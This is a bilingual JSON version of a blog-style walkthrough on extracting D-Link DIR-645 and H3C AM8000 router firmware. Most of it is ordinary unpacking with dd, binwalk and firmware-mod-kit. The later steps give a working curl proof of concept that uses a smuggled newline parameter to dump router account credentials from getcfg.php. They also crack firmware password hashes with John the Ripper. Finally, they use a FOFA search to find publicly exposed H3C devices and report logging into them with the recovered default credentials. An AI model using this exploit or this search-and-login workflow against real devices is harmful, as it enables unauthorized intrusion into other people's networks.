@@ -1,0 +1,296 @@
+{
+  "_source_md": "Binfiles/2021-07-08-Router-BinFile-Analysis.md",
+  "version": "1.0",
+  "title": {
+    "zh": "路由器固件提取与敏感信息分析",
+    "en": "Router Firmware Extraction and Sensitive Information Analysis"
+  },
+  "description": {
+    "zh": "本文档记录了D-Link DIR-645和H3C AM8000路由器固件的提取过程，包括手动和自动化提取Squashfs文件系统的方法、固件解包工具的使用，以及从固件中发现的敏感信息泄露漏洞（如getcfg.php未授权访问和默认弱口令）。",
+    "en": "This document records the firmware extraction process for D-Link DIR-645 and H3C AM8000 routers, covering both manual and automated methods for extracting Squashfs filesystems, the use of firmware unpacking tools, and the discovery of sensitive information leaks within the firmware (e.g., unauthorized access via getcfg.php and default weak credentials)."
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "环境与工具准备",
+        "en": "Environment and Tool Preparation"
+      },
+      "annotation": {
+        "zh": "在Ubuntu 18虚拟机中安装固件分析所需的基础工具，包括binwalk和firmware-mod-kit。",
+        "en": "Install essential firmware analysis tools, including binwalk and firmware-mod-kit, in an Ubuntu 18 virtual machine."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "克隆firmware-mod-kit仓库并安装依赖",
+            "en": "Clone firmware-mod-kit repository and install dependencies"
+          },
+          "code": "git clone https://github.com/mirror/firmware-mod-kit.git\nsudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "下载目标路由器固件",
+        "en": "Download Target Router Firmware"
+      },
+      "annotation": {
+        "zh": "从D-Link官方FTP服务器下载D-Link DIR-645 A1版本固件，文件名为DIR645A1_FW102B08.bin。",
+        "en": "Download the D-Link DIR-645 A1 firmware (DIR645A1_FW102B08.bin) from the official D-Link FTP server."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "固件下载地址",
+            "en": "Firmware Download URL"
+          },
+          "code": "https://ftp.dlink.ru/pub/Router/DIR-645/Firmware/Old/",
+          "language": "text"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "手动识别`Squashfs`文件系统签名",
+        "en": "Manually Identify `Squashfs` Filesystem Signature"
+      },
+      "annotation": {
+        "zh": "通过strings和hexdump命令在固件二进制文件中搜索'hqsq'特征签名，确定Squashfs文件系统的偏移位置。",
+        "en": "Use strings and hexdump commands to search for the 'hqsq' signature in the firmware binary to locate the offset of the Squashfs filesystem."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "搜索hsqs签名并定位偏移",
+            "en": "Search for hsqs signature and locate offset"
+          },
+          "code": "strings DIR645A1_FW102B08.bin | grep \"hsqs\"\nhexdump -C DIR645A1_FW102B08.bin | grep -n \"hsqs\"\n# Output: 88066:00160090  68 73 71 73 a3 07 00 00  29 64 cc 4e 00 00 01 00  |hsqs....)d.N....|",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "提取`Squashfs`文件系统头部信息",
+        "en": "Extract `Squashfs` Filesystem Header Information"
+      },
+      "annotation": {
+        "zh": "使用dd命令从偏移地址0x160090（十进制1441936）处截取100字节数据，并用file命令验证文件系统类型和大小。",
+        "en": "Use the dd command to extract 100 bytes from offset 0x160090 (decimal 1441936) and verify the filesystem type and size with the file command."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "截取Squashfs头部并验证",
+            "en": "Extract Squashfs header and verify"
+          },
+          "code": "dd if=DIR645A1_FW102B08.bin bs=1 count=100 skip=1441936 of=squash\nfile squash\n# Output: squash: Squashfs filesystem, little endian, version 4.0, 5958022 bytes, ...",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "提取完整的`Squashfs`文件系统",
+        "en": "Extract the Complete `Squashfs` Filesystem"
+      },
+      "annotation": {
+        "zh": "根据上一步获得的文件系统大小（5958022字节），使用dd命令将整个Squashfs分区从固件中分离出来。",
+        "en": "Based on the filesystem size (5958022 bytes) obtained in the previous step, use the dd command to carve out the entire Squashfs partition from the firmware."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "提取完整Squashfs分区",
+            "en": "Extract full Squashfs partition"
+          },
+          "code": "dd if=DIR645A1_FW102B08.bin bs=1 count=5958022 skip=1441936 of=kernel.squash",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "编译并使用`firmware-mod-kit`解包",
+        "en": "Compile and Use `firmware-mod-kit` to Unpack"
+      },
+      "annotation": {
+        "zh": "编译firmware-mod-kit工具，并使用其中的unsquashfs_all.sh脚本解压提取出的kernel.squash文件。注意避免在共享文件夹中编译导致的权限问题。",
+        "en": "Compile the firmware-mod-kit tool and use the unsquashfs_all.sh script to unpack the extracted kernel.squash file. Be aware of permission issues when compiling in a shared folder."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "编译工具并解包",
+            "en": "Compile tool and unpack"
+          },
+          "code": "cd firmware-mod-kit/src\n./configure && make\n# If make error due to shared folder, move directory and clean\nmake clean\nmv firmware-mod-kit/* ~/Desktop/firmware-mod-kit/ && cd ~/Desktop/firmware-mod-kit/src\n./configure && make\ncd ../\n./unsquashfs_all.sh ../kernel.squash",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![手动提取Squashfs过程截图](https://image.isisy.com/images/2022/02/20/NyGEhMbqeTm3rOQ.png)",
+      "toolName": "Manual_Squashfs_Extraction_Screenshot"
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "使用`Binwalk`自动化提取固件",
+        "en": "Automated Firmware Extraction Using `Binwalk`"
+      },
+      "annotation": {
+        "zh": "使用binwalk的-Me参数递归提取固件内容，然后手动调用unsquashfs_all.sh解压提取出的160090.squashfs文件。",
+        "en": "Use binwalk with the -Me flag to recursively extract firmware contents, then manually invoke unsquashfs_all.sh to unpack the extracted 160090.squashfs file."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "Binwalk提取并解包",
+            "en": "Binwalk extraction and unpacking"
+          },
+          "code": "binwalk -Me DIR645A1_FW102B08.bin\ncd _DIR645A1_FW102B08.bin.extracted/\n/path/to/firmware-mod-kit/unsquashfs_all.sh 160090.squashfs",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![Binwalk提取过程对比截图](https://image.isisy.com/images/2022/02/20/TJiGF8ov4OW5gNH.png)",
+      "toolName": "Binwalk_vs_Manual_Extraction_Comparison"
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "分析DIR-645固件敏感信息泄露（`getcfg.php`）",
+        "en": "Analyze DIR-645 Firmware Sensitive Information Leak (`getcfg.php`)"
+      },
+      "annotation": {
+        "zh": "在固件文件系统中发现getcfg.php文件存在未授权访问漏洞，攻击者可通过构造POST参数读取敏感配置。下方提供了漏洞代码片段和POC。",
+        "en": "Discovered an unauthorized access vulnerability in getcfg.php within the firmware filesystem. Attackers can craft POST parameters to read sensitive configurations. The vulnerable code snippet and POC are provided below."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "getcfg.php漏洞代码片段",
+            "en": "Vulnerable Code Snippet from getcfg.php"
+          },
+          "code": "<?\nif ($_POST[\"CACHE\"] == \"true\")\n{\n\techo dump(1, \"/runtime/session/\".$SESSION_UID.\"/postxml\");\n}\nelse\n{\n\t$SERVICE_COUNT = cut_count($_POST[\"SERVICES\"], \",\");\n\t...\n\t$file = \"/htdocs/webinc/getcfg/\".$GETCFG_SVC.\".xml.php\";\n\tif (isfile($file)==\"1\") dophp(\"load\", $file);\n}\n?>",
+          "language": "php"
+        },
+        {
+          "caption": {
+            "zh": "敏感信息读取POC",
+            "en": "Sensitive Information Disclosure POC"
+          },
+          "code": "curl -d \"SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1\" \"http://{ip.addr}:{ip.port}/info/getcfg.php\"",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![getcfg.php漏洞分析截图](https://image.isisy.com/images/2022/02/20/QxocdSr2PITnA9J.png)",
+      "toolName": "DIR645_getcfg_php_Vulnerability_Screenshot"
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "下载并提取H3C AM8000固件",
+        "en": "Download and Extract H3C AM8000 Firmware"
+      },
+      "annotation": {
+        "zh": "从H3C官网下载AM8000V100R008.bin固件，并使用binwalk直接提取，发现内含shadow文件。",
+        "en": "Download the AM8000V100R008.bin firmware from the H3C official website and extract it directly with binwalk, revealing a shadow file inside."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "H3C固件下载地址",
+            "en": "H3C Firmware Download URL"
+          },
+          "code": "https://download.h3c.com.cn/download.do?id=2280937",
+          "language": "text"
+        },
+        {
+          "caption": {
+            "zh": "Binwalk提取H3C固件",
+            "en": "Extract H3C firmware with binwalk"
+          },
+          "code": "binwalk -Me AM8000V100R008.bin",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![H3C固件提取发现shadow文件截图](https://image.isisy.com/images/2022/02/20/gZJaWD2EswuilcN.png)",
+      "toolName": "H3C_Firmware_Extraction_Shadow_File_Screenshot"
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "破解H3C固件中的Shadow密码哈希",
+        "en": "Crack Password Hashes in H3C Firmware Shadow File"
+      },
+      "annotation": {
+        "zh": "使用John the Ripper工具对提取出的shadow文件中的MD5 Crypt哈希进行破解，获取默认凭据。",
+        "en": "Use John the Ripper to crack the MD5 Crypt hashes found in the extracted shadow file to obtain default credentials."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "John the Ripper破解命令",
+            "en": "John the Ripper Cracking Command"
+          },
+          "code": "john -format=md5crypt {file/path}\njohn --show {file/path}",
+          "language": "bash"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![John破解shadow哈希结果截图](https://image.isisy.com/images/2022/02/20/gmQKfkXq5w2nDsA.png)",
+      "toolName": "John_the_Ripper_Crack_Shadow_Hash_Screenshot"
+    },
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "H3C设备默认凭据与资产发现",
+        "en": "H3C Device Default Credentials and Asset Discovery"
+      },
+      "annotation": {
+        "zh": "利用获取的默认账号密码尝试登录公网暴露的H3C设备。使用FOFA语法 'userLogin.asp' 进行资产发现，并成功登录存在弱口令的设备。",
+        "en": "Use the obtained default credentials to attempt login on publicly exposed H3C devices. Use FOFA query 'userLogin.asp' for asset discovery, and successfully log in to devices with weak passwords."
+      },
+      "codeBlocks": [
+        {
+          "caption": {
+            "zh": "H3C设备资产发现语法",
+            "en": "H3C Device Asset Discovery Query"
+          },
+          "code": "fofa: userLogin.asp",
+          "language": "text"
+        }
+      ]
+    },
+    {
+      "type": "tool_result",
+      "content": "![成功登录H3C设备后台截图](https://image.isisy.com/images/2022/02/20/IoJDbNSjw61398x.png)",
+      "toolName": "H3C_Device_Login_Success_Screenshot"
+    },
+    {
+      "type": "tool_result",
+      "content": "![H3C设备Telnet连接成功截图](https://image.isisy.com/images/2022/02/20/ZzPJSMpRnKqVNUQ.png)",
+      "toolName": "H3C_Device_Telnet_Access_Screenshot"
+    }
+  ]
+}
